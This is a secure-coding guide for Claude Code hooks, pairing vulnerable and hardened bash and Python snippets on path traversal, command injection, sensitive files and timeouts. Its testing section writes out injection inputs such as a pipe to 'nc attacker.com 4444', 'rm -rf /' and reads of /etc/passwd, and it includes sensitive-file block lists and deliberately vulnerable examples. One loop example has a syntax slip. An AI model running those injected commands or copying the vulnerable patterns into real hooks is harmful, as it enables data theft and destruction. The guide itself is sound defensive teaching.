# Hook Security Guide

Best practices for writing secure Claude Code hooks.

## Core Security Principles

### 1. Validate All Inputs

Never trust hook input data. Always validate and sanitize:

**Bad:**
```bash
#!/bin/bash
input=$(cat)
file_path=$(echo "$input" | jq -r '.tool_input.file_path')
cat "$file_path"  # Vulnerable to path traversal!
```

**Good:**
```bash
#!/bin/bash
input=$(cat)
file_path=$(echo "$input" | jq -r '.tool_input.file_path // empty')

# Validate path is within project directory
if [[ "$file_path" =~ \.\. ]]; then
  echo "Error: Path traversal detected" >&2
  exit 2
fi

# Resolve to absolute path and check it's within project
real_path=$(realpath "$file_path" 2>/dev/null)
if [[ "$real_path" != "$CLAUDE_PROJECT_DIR"* ]]; then
  echo "Error: Path outside project directory" >&2
  exit 2
fi

cat "$file_path"
```

### 2. Always Quote Variables

Prevent word splitting and glob expansion:

**Bad:**
```bash
#!/bin/bash
file_path=$1  # Unquoted
rm -rf $file_path  # DANGEROUS!
```

**Good:**
```bash
#!/bin/bash
file_path="$1"  # Quoted
rm -rf "$file_path"  # Safe
```

### 3. Use Absolute Paths

Never rely on relative paths or PATH environment:

**Bad:**
```json
{
  "command": "python script.py"
}
```

**Good:**
```json
{
  "command": "\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/script.py"
}
```

### 4. Block Path Traversal

Check for `..` in file paths:

```bash
#!/bin/bash
file_path="$1"

# Check for path traversal attempts
if [[ "$file_path" =~ \.\. ]] || [[ "$file_path" =~ ~ ]]; then
  echo "Error: Invalid path detected" >&2
  exit 2
fi
```

### 5. Skip Sensitive Files

Never expose secrets, keys, or credentials:

```python
#!/usr/bin/env python3
import os

SENSITIVE_PATTERNS = [
    '.env',
    '.env.',
    'credentials.',
    'secret',
    'private_key',
    '.aws/credentials',
    '.ssh/id_',
]

def is_sensitive(file_path: str) -> bool:
    """Check if file appears to be sensitive."""
    for pattern in SENSITIVE_PATTERNS:
        if pattern in file_path.lower():
            return True
    return False

# Block access to sensitive files
if is_sensitive(file_path):
    sys.exit(2)
```

## Common Vulnerabilities

### Command Injection

**Vulnerable:**
```bash
#!/bin/bash
input=$(cat)
command=$(echo "$input" | jq -r '.tool_input.command')
eval $command  # DANGEROUS!
```

**Safe:**
```bash
#!/bin/bash
input=$(cat)
command=$(echo "$input" | jq -r '.tool_input.command')

# Never use eval - validate and allowlist instead
if [[ "$command" =~ ^(git|npm|node|python3)\s ]]; then
  eval "$command"  # Still risky, better to avoid eval entirely
else
  echo "Command not allowed" >&2
  exit 2
fi
```

**Safest:**
```bash
#!/bin/bash
# Don't execute arbitrary commands at all
# Instead, validate specific allowed operations
```

### Arbitrary File Access

**Vulnerable:**
```bash
#!/bin/bash
file_path="$1"
cat "$file_path"  # Could read /etc/passwd, ~/.ssh/id_rsa, etc.
```

**Safe:**
```bash
#!/bin/bash
file_path="$1"

# Only allow files within project directory
project_root="$CLAUDE_PROJECT_DIR"
real_path=$(realpath "$file_path" 2>/dev/null)

if [[ "$real_path" != "$project_root"* ]]; then
  echo "Error: Access denied - file outside project" >&2
  exit 2
fi

# Also block sensitive patterns
if [[ "$file_path" =~ \.env ]] || [[ "$file_path" =~ credentials ]]; then
  echo "Error: Access denied - sensitive file" >&2
  exit 2
fi

cat "$file_path"
```

### Resource Exhaustion

**Vulnerable:**
```bash
#!/bin/bash
# Could hang indefinitely
while true; do
  echo "processing..."
done
```

**Safe:**
```bash
#!/bin/bash
# Add timeout in hook configuration
# And handle termination gracefully

timeout_seconds=30
elapsed=0

while [ $elapsed -lt $timeout_seconds ]; do
  # Processing...
  sleep 1
  elapsed=$((elapsed + 1))
done
```

## Input Validation Patterns

### Allowlisting vs Blocklisting

**Prefer allowlisting:**

```python
#!/usr/bin/env python3
# Safe: Only allow known-safe operations
ALLOWED_COMMANDS = {
    'git': ['log', 'status', 'diff', 'branch'],
    'npm': ['test', 'lint', 'build'],
}

def validate_command(command: str) -> bool:
    parts = command.split()
    if not parts:
        return False

    cmd = parts[0]
    if cmd not in ALLOWED_COMMANDS:
        return False

    if len(parts) > 1:
        subcmd = parts[1]
        if subcmd not in ALLOWED_COMMANDS[cmd]:
            return False

    return True
```

**Blocklisting is less secure:**

```python
#!/usr/bin/env python3
# Less safe: Easy to miss dangerous patterns
DANGEROUS_COMMANDS = ['rm', 'dd', 'mkfs']

def validate_command(command: str) -> bool:
    for dangerous in DANGEROUS_COMMANDS:
        if dangerous in command:
            return False
    return True  # Might miss new dangerous patterns!
```

### JSON Validation

Always validate JSON structure:

```python
#!/usr/bin/env python3
import json
import sys

def safe_json_load(stdin_data: str) -> dict:
    """Safely load and validate JSON input."""
    try:
        data = json.loads(stdin_data)
    except json.JSONDecodeError as e:
        print(f"Invalid JSON: {e}", file=sys.stderr)
        sys.exit(2)

    # Validate required fields
    required = ['hook_event_name', 'tool_name', 'tool_input']
    missing = [field for field in required if field not in data]

    if missing:
        print(f"Missing required fields: {missing}", file=sys.stderr)
        sys.exit(2)

    return data

if __name__ == "__main__":
    import sys
    input_data = safe_json_load(sys.stdin.read())
    # Process...
```

## Environment Variable Safety

### Don't Trust Environment

```bash
#!/bin/bash
# Don't assume PATH is safe
export PATH="/usr/bin:/bin"

# Don't assume HOME is what you expect
# Validate before using
```

### Use CLAUDE_PROJECT_DIR

```bash
#!/bin/bash
# Good: Use provided environment variable
script_dir="${CLAUDE_PROJECT_DIR}/.claude/hooks"
config_file="${script_dir}/config.json"

# Bad: Assume current directory
# config_file="./config.json"  # Could be anywhere!
```

## File Permission Safety

### Check Permissions Before Access

```bash
#!/bin/bash
file_path="$1"

# Check file exists and is readable
if [ ! -f "$file_path" ]; then
  echo "Error: File not found" >&2
  exit 2
fi

if [ ! -r "$file_path" ]; then
  echo "Error: File not readable" >&2
  exit 2
fi

# Check it's a regular file (not symlink, device, etc.)
if [ ! -f "$file_path" ]; then
  echo "Error: Not a regular file" >&2
  exit 2
fi

cat "$file_path"
```

### Prevent Following Symlinks

```bash
#!/bin/bash
file_path="$1"

# Resolve symlinks and check result
real_path=$(realpath "$file_path" 2>/dev/null)

if [ -z "$real_path" ]; then
  echo "Error: Cannot resolve path" >&2
  exit 2
fi

# Check if it was a symlink
if [ "$real_path" != "$file_path" ]; then
  # Original path was a symlink
  echo "Error: Symlinks not allowed" >&2
  exit 2
fi
```

## Secret Protection

### Never Log Secrets

```python
#!/usr/bin/env python3
import re

def redact_secrets(text: str) -> str:
    """Remove potential secrets from text."""
    # Redact API keys
    text = re.sub(r'(sk-[a-zA-Z0-9]{20,})', '[REDACTED]', text)

    # Redact passwords
    text = re.sub(r'(password["\']?\s*[:=]\s*)["\']?[^\s"\']+["\']?',
                  r'\1[REDACTED]', text, flags=re.IGNORECASE)

    # Redact tokens
    text = re.sub(r'(token["\']?\s*[:=]\s*)["\']?[^\s"\']+["\']?',
                  r'\1[REDACTED]', text, flags=re.IGNORECASE)

    return text

# Before logging
log_message = redact_secrets(log_message)
print(log_message)
```

### Check for Secrets in Paths

```python
#!/usr/bin/env python3
SECRET_PATH_PATTERNS = [
    r'\.env',
    r'credentials',
    r'secret',
    r'private[_-]?key',
    r'\.aws/credentials',
    r'\.ssh/id_',
    r'\.pem',
    r'\.key',
]

def has_secret_in_path(path: str) -> bool:
    """Check if path might contain secrets."""
    path_lower = path.lower()
    return any(re.search(pattern, path_lower) for pattern in SECRET_PATH_PATTERNS)
```

## Timeout and Resource Limits

### Set Reasonable Timeouts

```json
{
  "type": "command",
  "command": "\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/safe-hook.sh",
  "timeout": 30
}
```

### Handle Timeouts Gracefully

```bash
#!/bin/bash
# Implement internal timeout
timeout_seconds=30

# Use timeout command if available
if command -v timeout &> /dev/null; then
  timeout "$timeout_seconds" ./long-running-script.sh
else
  # Fallback: manual timeout check
  start_time=$(date +%s)

  while true; do
    current_time=$(date +%s)
    elapsed=$((current_time - start_time))

    if [ $elapsed -ge $timeout_seconds ]; then
      echo "Timeout exceeded" >&2
      exit 2
    fi

    # Do work...
    break
  fi
fi
```

## Testing Security

### Test Path Traversal

```bash
# Test cases for path validation
test_cases=(
  "../../../etc/passwd"
  "~/.ssh/id_rsa"
  "/etc/passwd"
  "normal/file.txt"
  "../sibling-file.txt"
)

for test in "${test_cases[@]}"; do
  echo "$test" | ./your-hook.sh
  echo "Exit code: $?"
done
```

### Test Command Injection

```bash
# Test malicious inputs
echo 'file.txt; rm -rf /' | ./your-hook.sh
echo 'file.txt && cat /etc/passwd' | ./your-hook.sh
echo 'file.txt | nc attacker.com 4444' | ./your-hook.sh
```

### Test Secret Detection

```python
# Test secret detection
test_paths = [
    'config.py',
    '.env',
    'credentials.json',
    'secret.txt',
    '.aws/credentials',
    'normal_file.txt',
]

for path in test_paths:
    result = has_secret_in_path(path)
    print(f"{path}: {'BLOCK' if result else 'ALLOW'}")
```

## Security Checklist

Before deploying a hook, verify:

- [ ] All inputs are validated and sanitized
- [ ] All variables are properly quoted
- [ ] Absolute paths are used (via `$CLAUDE_PROJECT_DIR`)
- [ ] Path traversal is blocked (`..` detection)
- [ ] Sensitive files are protected
- [ ] No `eval` or command injection
- [ ] File permissions are checked
- [ ] Secrets are never logged
- [ ] Timeouts are configured
- [ ] Error handling is comprehensive
- [ ] Hook has been tested with malicious inputs
- [ ] Exit codes are used correctly

## Safe Hook Template

```bash
#!/usr/bin/env bash
# Template for secure hooks
set -euo pipefail

# Configuration
readonly MAX_FILE_SIZE=10485760  # 10MB
readonly TIMEOUT_SECONDS=30

# Security functions
validate_path() {
  local path="$1"

  # Check for path traversal
  if [[ "$path" =~ \.\. ]] || [[ "$path" =~ ^~ ]]; then
    echo "Error: Invalid path pattern" >&2
    return 1
  fi

  # Resolve to absolute path
  local real_path
  real_path=$(realpath "$path" 2>/dev/null) || return 1

  # Check within project directory
  if [[ "$real_path" != "$CLAUDE_PROJECT_DIR"* ]]; then
    echo "Error: Path outside project directory" >&2
    return 1
  fi

  # Check for sensitive patterns
  local path_lower
  path_lower=$(echo "$path" | tr '[:upper:]' '[:lower:]')
  if [[ "$path_lower" =~ (\.env|credentials|secret|private_key|\.pem|\.key) ]]; then
    echo "Error: Sensitive file access denied" >&2
    return 1
  fi

  echo "$real_path"
}

validate_input() {
  local input="$1"

  # Validate JSON
  if ! echo "$input" | jq . > /dev/null 2>&1; then
    echo "Error: Invalid JSON input" >&2
    return 1
  fi

  # Check required fields
  local required_fields=('hook_event_name' 'tool_name')
  for field in "${required_fields[@]}"; do
    if ! echo "$input" | jq -e ".$field" > /dev/null 2>&1; then
      echo "Error: Missing required field: $field" >&2
      return 1
    fi
  done
}

# Main hook logic
main() {
  # Read input
  local input
  input=$(cat)

  # Validate input
  validate_input "$input" || exit 2

  # Extract and validate file path if present
  local file_path
  file_path=$(echo "$input" | jq -r '.tool_input.file_path // empty')

  if [[ -n "$file_path" ]]; then
    file_path=$(validate_path "$file_path") || exit 2
  fi

  # Your hook logic here...
  # ...

  exit 0
}

main "$@"
```

Remember: **USE AT YOUR OWN RISK**. Hooks execute with your user permissions and can access/modify anything you can access. Always review and test hooks thoroughly before use.
